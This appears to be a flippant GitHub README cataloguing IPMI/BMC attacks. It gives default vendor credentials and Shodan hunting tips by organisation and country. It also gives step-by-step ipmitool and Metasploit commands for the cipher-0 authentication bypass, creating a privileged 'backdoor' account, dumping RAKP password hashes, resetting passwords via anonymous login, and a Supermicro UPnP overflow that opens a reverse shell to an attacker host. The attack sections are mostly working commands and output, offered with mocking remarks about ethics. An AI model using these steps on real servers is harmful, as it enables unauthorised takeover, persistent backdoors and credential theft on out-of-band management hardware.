# Awesome-IPMI
The one that just not exploit IPMI protocol.
Well this is a documentation of the IPMI based vulnerabilities, exploits and other relevant information regarding this protocol. 
SARCASM, TROLLING and JOKES are ADVISED.

# What the hack is IPMI?

### Academic way to say
Intelligent Platform Management Interface (IPMI) is a set of computer interface specifications for an autonomous computer subsystem that provides management and monitoring capabilities independently of the host system's CPU, firmware (BIOS or UEFI) and operating system. IPMI defines a set of interfaces used by system administrators for out-of-band management of computer systems and monitoring of their operation. For example, IPMI provides a way to manage a computer that may be powered off or otherwise unresponsive by using a network connection to the hardware rather than to an operating system or login shell.

### Noob way to say
Intelligent Platform Management Interface (IPMI) is a service and runs in general on port 623 which allows you to manage or monitor capabilities independently of the host system's CPU, firmware (BIOS or UEFI) and operating system.

### Hackers way to say
nmap target => port 623 => IPMI => Jackpot (https://www.youtube.com/watch?v=dQw4w9WgXcQ)

# IPMI Components
![Image of IPMI](https://upload.wikimedia.org/wikipedia/commons/f/f2/IPMI-Block-Diagram.png)

Heh .. I don't care, he doesn't care ... maybe you don't care ... lets hack the s**t out of it!

# Hunting for IPMI
### Normal peoples
Well you could use nmap or anything that can give open ports and services at a local or not so local network. Yes sir, you could also use commercial tools like Nessus or Nexpose but at the end of day is still poor security of IPMI that can allow an attacker to hack it in under 5 minutes (if he writes commands in terminal by hand and tends to make lots of mistakes).
But you know what? We can use Shodan (shodan.io) to search for a target (hei hei ... stop, stop .. be ethical!).

Hunting tactics > open pc > connect to the internet (sarcasm) > Log in / Register to Shodan > Search for port:623
(#facepalm, #hacking_like_a_pro, #hashtag, #even_more_sarcasm)

Well by doing that you will get like over 100.000 (> 100k) possible vulnerable servers from all around the world.

Don't you believe it? Here is a picture of it:
![Sitting ducks for Hackers](https://preview.ibb.co/c506BF/ipmi.png)

### Angry Hackers
Just add your desired organization (org: ...)

### Cyber Warfare
Just add your desired country (country: ...)

# Only one exploit and one vulnerability?
Hell no!

## Old school standard Usernames & Passwords
| Product name                                    | Default username | Default password                        |
|-------------------------------------------------|------------------|-----------------------------------------|
| ASUS iKVM BMC                                   | admin            | admin                                   |
| Dell Remote Access Card (iDRAC, DRAC)           | root             | calvin                                  |
| Fujitsu Integrated Remote Management Controller | admin            | admin                                   |
| HP Integrated Lights Out (iLO)                  | Administrator    | <factory randomized 8-character string> |
| IBM Integrated Management Module (IMM)          | USERID           | PASSW0RD (with a zero)                  |
| Oracle/Sun Integrated Lights Out Manager (ILOM) | root             | changeme                                |
| Supermicro IPMI (2.0)                           | ADMIN            | ADMIN                                   |

This is no big deal but people just forget about IPMI protocol so they don't change password or restrict access at all.

## IPMI Authentication Bypass via Cipher 0
Dan Farmer identified a serious failing of the IPMI 2.0 specification, namely that cipher type 0, an indicator that the client wants to use clear-text authentication, actually allows access with any password. Cipher 0 issues were identified in HP, Dell, and Supermicro BMCs, with the issue likely encompassing all IPMI 2.0 implementations. It is easy to identify systems that have cipher 0 enabled using the ipmi_cipher_zero module in the Metasploit Framework

#### Identification using Metasploit
```$ msfconsole
 
`      =[ metasploit v4.7.0-dev [core:4.7 api:1.0]
+ -- --=[ 1119 exploits - 638 auxiliary - 179 post
+ -- --=[ 309 payloads - 30 encoders - 8 nops
 
msf> use auxiliary/scanner/ipmi/ipmi_cipher_zero
msf auxiliary(ipmi_cipher_zero) > set RHOSTS 10.0.0.0/24
msf auxiliary(ipmi_cipher_zero) > run
[*] Sending IPMI requests to 10.0.0.0->10.0.0.255 (256 hosts)
[+] 10.0.0.99:623 VULNERABLE: Accepted a session open request for cipher zero
[+] 10.0.0.132:623 VULNERABLE: Accepted a session open request for cipher zero
[+] 10.0.0.141:623 VULNERABLE: Accepted a session open request for cipher zero
[+] 10.0.0.153:623 VULNERABLE: Accepted a session open request for cipher zero
```

#### Exploiting using IPMITOOL
First of let's install the tool (sudo apt-get install ipmitool) and after let's use it to bypass authentification.
```
$ ipmitool -I lanplus -H 10.0.0.99 -U Administrator -P FluffyWabbit user list
```
Error: Unable to establish IPMI v2 / RMCP+ session
Get User Access command failed (channel 14, user 1)
```
$ ipmitool -I lanplus -C 0 -H 10.0.0.99 -U Administrator -P FluffyWabbit user list
```
ID  Name        Callin  Link Auth    IPMI Msg  Channel Priv Limit

1  Administrator    true    false      true      ADMINISTRATOR

2  (Empty User)    true    false      false      NO ACCESS

```
$ ipmitool -I lanplus -C 0 -H 10.0.0.99 -U Administrator -P FluffyWabbit user set name 2 backdoor
```
```
$ ipmitool -I lanplus -C 0 -H 10.0.0.99 -U Administrator -P FluffyWabbit user set password 2 password
```
```
$ ipmitool -I lanplus -C 0 -H 10.0.0.99 -U Administrator -P FluffyWabbit user priv 2 4
```
```
$ ipmitool -I lanplus -C 0 -H 10.0.0.99 -U Administrator -P FluffyWabbit user enable 2
```
```
$ ipmitool -I lanplus -C 0 -H 10.0.0.99 -U Administrator -P FluffyWabbit user list
```
ID  Name        Callin  Link Auth    IPMI Msg  Channel Priv Limit

1  Administrator    true    false      true      ADMINISTRATOR

2  backdoor              true    false      true      ADMINISTRATOR

``` 
$ ssh backdoor@10.0.0.99
backdoor@10.0.0.99's password: password
```

User:backdoor logged-in to ILOMXQ3469216(10.0.0.99)

iLO 4 Advanced Evaluation 1.13 at  Nov 08 2012

Server Name: host is unnamed

Server Power: On
 
</>hpiLO->
#### How this work?
```
Hacker: I want to login!
Server: Yes, please say your account and password!
Hacker: Admin, Admin
Server: Password incorect!
Hacker: I want to login over an unecrypted chanel!
Server: Yes, please say your account and password!
Hacker: Admin, Admin
Server: Access granted!
```
## IPMI 2.0 RAKP Authentication Remote Password Hash Retrieval  (A: are you that serious?)
#### Exploiting with Metasploit
```
$ msfconsole
 
      =[ metasploit v4.7.0-dev [core:4.7 api:1.0]
+ -- --=[ 1119 exploits - 638 auxiliary - 179 post
+ -- --=[ 309 payloads - 30 encoders - 8 nops
 
msf> use auxiliary/scanner/ipmi/ipmi_dumphashes 
msf auxiliary(ipmi_dumphashes) > set RHOSTS 10.0.0.0/24
msf auxiliary(ipmi_dumphashes) > set THREADS 256
msf auxiliary(ipmi_dumphashes) > run
 
[+] 10.0.0.59 root:266ead5921000000....000000000000000000000000000000001404726f6f74:eaf2bd6a5 3ee18e3b2dfa36cc368ef3a4af18e8b
[+] 10.0.0.59 Hash for user 'root' matches password 'calvin'
[+] 10.0.0.59 :408ee18714000000d9cc....000000000000000000000000000000001400:93503c1b7af26abee 34904f54f26e64d580c050e
[+] 10.0.0.59 Hash for user '' matches password 'admin'
```
Then if you have unknown hashes you just have to bruteforce them but don't was time doing that if you don't acctualy need a specific account on the system. Just becouse it will be a waste of time with so many critical vulnerabilities.

#### How this works?
In short, the authentication process for IPMI 2.0 mandates that the server send a salted SHA1 or MD5 hash of the requested user's password to the client, prior to the client authenticating. 

You heard that right - the BMC will tell you the password hash for any valid user account you request. 
```
Hacker: I want to login!
Server: Yes, please say your account and password! But here are all my accounts and MD5/SHA1 hashed passwords!
Hacker: Thanks I will bruteforce those hashes in a second and I will return with a valid username and password!
Server: Ok!
```

## IPMI Anonymous Authentication (B: Yes)
#### Exploiting with IPMITOOL
```
$ ipmitool -I lanplus -H 10.0.0.97 -U '' -P '' user list
```
ID  Name        Callin  Link Auth    IPMI Msg  Channel Priv Limit

1                    false  false      true      ADMINISTRATOR

2  root            false  false      true      ADMINISTRATOR

3  admin            true    true      true      ADMINISTRATOR
```
$ ipmitool -I lanplus -H 10.0.0.97 -U '' -P '' user set password 2 password
```
At this point we can login to the BMC over SSH using the new password for the root user account.
```
$ ssh root@10.0.0.97
root@10.0.0.97's password: password
```
> > SMASH-CLP Console v1.09 <<
->
#### How this works?


```
Hacker: I want to login!
Server: Yes, please say your account and password! But here are all my accounts and MD5/SHA1 hashed passwords!
Hacker: '','' (no account and no password)
Server: Access granted!
```
Crazy enough?

## Supermicro IPMI UPnP Vulnerability (A: Is it going to end now?)
The interesting thing about this attack is that it yields complete root access to the BMC, something that is otherwise difficult to obtain. Keep in mind than an attacker with administrative access, either over the network or from a root shell on the host system, can downgrade the firmware of a Supermicro BMC to a vulnerable version and then exploit it. Once root access is obtained, it is possible to read cleartext credentials from the file system, install additional software, and integrate permanent backdoors into the BMC that would survive a full reinstall of the host's operating system.

#### Exploit in Metasploit
```
$ msfconsole
 
      =[ metasploit v4.7.0-dev [core:4.7 api:1.0]
+ -- --=[ 1119 exploits - 638 auxiliary - 179 post
+ -- --=[ 309 payloads - 30 encoders - 8 nops
 
msf> use exploit/multi/upnp/libupnp_ssdp_overflow 
msf exploit(libupnp_ssdp_overflow) > set RHOST 10.0.0.98
msf exploit(libupnp_ssdp_overflow) > set LHOST 10.0.0.55 
msf exploit(libupnp_ssdp_overflow) > set PAYLOAD cmd/unix/reverse_openssl 
msf exploit(libupnp_ssdp_overflow) > exploit 
 
[*] Started reverse double handler
[*] Exploiting 10.0.0.98 with target 'Supermicro Onboard IPMI (X9SCL/X9SCM) Intel SDK 1.3.1' with 2106 bytes to port 1900...
[+] Sending payload of 182 bytes to 10.0.0.98:4259...
[*] Command shell session 1 opened (10.0.0.55:4444 -> 10.0.0.98:3688) at 2013-06-24 13:35:24 -0500
[*] Shutting down payload stager listener...
 
uname -a
Linux (none) 2.6.17.WB_WPCM450.1.3 #1 Wed Nov 14 10:33:10 PST 2012 armv5tejl unknown
```

## Supermicro IPMI Clear-text Passwords (B: No)
I already have access to the system (maybe an unprivileged user) and I want to get more access.

```
$ cat /nv/PSBlock
  admin                      ADMINpassword^TT                    rootOtherPassword!
```

#### What is broken?
#### IPMI for sure is!

# But what is the big deal?
Well the main issue is that this vulnerability is a well known vulnerability that no one cares about!

#### IPMI DDOS BOTNET
And because no one cares about it someone decided in 2014 to make an IPMI based botnet using over 100.000 compromise servers and used that botnet to send a 300Gbps DDoS Attack (personal proof of concept code will follow). 

And were are we now? Same stage of security and hackers can find there targets using as an example (but not restricting to) Shodan.




# Sources
* https://community.rapid7.com/community/metasploit/blog/2013/07/02/a-penetration-testers-guide-to-ipmi
* https://securityledger.com/2014/08/was-an-ipmi-flaw-behind-300gbps-ddos-attack-computerworlduk-com/

## Contributing

1. Fork it
2. Create your feature branch (```git checkout -b my-new-feature```)
3. Commit your changes (```git commit -am 'Add some feature'```)
4. Push to the branch (```git push origin my-new-feature```)
5. Create new Pull Request

Donations at: https://www.paypal.me/LNitescu
